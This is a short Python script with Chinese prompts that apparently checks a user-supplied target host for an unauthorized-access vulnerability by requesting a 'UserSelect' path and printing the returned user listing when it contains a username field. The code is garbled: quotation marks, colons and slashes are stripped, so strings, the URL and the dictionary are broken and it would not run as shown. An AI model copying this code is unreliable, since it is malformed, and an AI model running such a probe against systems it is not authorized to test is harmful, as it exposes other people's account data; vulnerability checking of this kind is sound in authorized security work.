import requests  
  
host = input(请输入目标主机地址：)  
  
headers = {  
    User-Agent Mozilla5.0 (Windows NT 10.0; Win64; x64) AppleWebKit537.36 (KHTML, like Gecko) Chrome114.0.0.0 Safari537.36,  
    Content-Type applicationx-www-form-urlencoded,  
    Connection close  
}  
  
url = fhttp{host}UserSelect  
response = requests.get(url, headers=headers)  
  
if 用户名 in response.text  
    print(未授权访问漏洞存在！)  
    print(response.text)  
else  
    print(未授权访问漏洞不存在。)